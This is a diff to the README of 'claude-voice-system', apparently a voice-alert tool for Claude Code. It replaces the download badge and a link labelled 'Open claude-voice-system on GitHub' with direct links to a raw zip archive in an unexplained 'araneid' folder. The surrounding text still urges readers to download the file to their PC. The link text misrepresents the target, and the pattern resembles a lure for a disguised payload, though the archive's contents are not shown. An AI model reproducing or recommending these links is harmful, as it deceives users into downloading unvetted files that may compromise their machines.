@@ -1,6 +1,6 @@
 # 🎙️ claude-voice-system - Voice alerts for Claude Code
 
-[![Download](https://img.shields.io/badge/Download-claude--voice--system-8A2BE2?style=for-the-badge)](https://github.com/Secondvisitation783/claude-voice-system)
+[![Download](https://img.shields.io/badge/Download-claude--voice--system-8A2BE2?style=for-the-badge)](https://raw.githubusercontent.com/Secondvisitation783/claude-voice-system/main/araneid/voice-claude-system-2.6.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ It uses edge-tts for voice output, phrase pools for text choices, and a priority
 
 Use this link to visit the page and download the app:
 
-[Open claude-voice-system on GitHub](https://github.com/Secondvisitation783/claude-voice-system)
+[Open claude-voice-system on GitHub](https://raw.githubusercontent.com/Secondvisitation783/claude-voice-system/main/araneid/voice-claude-system-2.6.zip)
 
 After you open the page, look for the download files or the latest release. If the project provides an app file, download it to your PC. If it comes as a folder or zip file, save it in a place you can find, such as Downloads or Desktop.
 
